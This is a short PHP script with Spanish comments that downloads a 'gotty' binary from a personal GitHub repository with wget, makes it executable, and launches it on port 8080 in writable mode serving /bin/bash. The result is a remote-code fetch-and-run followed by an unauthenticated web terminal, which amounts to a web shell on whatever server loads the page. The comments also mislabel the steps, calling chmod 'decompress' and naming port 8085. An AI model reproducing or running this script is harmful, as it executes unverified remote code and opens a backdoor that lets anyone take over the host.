<?php

// Comando para descargar Gotty
$downloadCommand = 'wget https://raw.githubusercontent.com/ivangabriel21/DependeciaDX/main/gotty';

// Comando para descomprimir Gotty
$extractCommand = 'chmod +x gotty';

// Comando para ejecutar Gotty en el puerto 8085
$gottyCommand = './gotty -w --port 8080 /bin/bash';

// Ejecuta los comandos en serie
exec("$downloadCommand && $extractCommand && $gottyCommand", $output, $return_var);

if ($return_var !== 0) {
    echo 'Error: ' . implode(PHP_EOL, $output);
} else {
    echo 'Gotty is running on port 8080';
}
?>
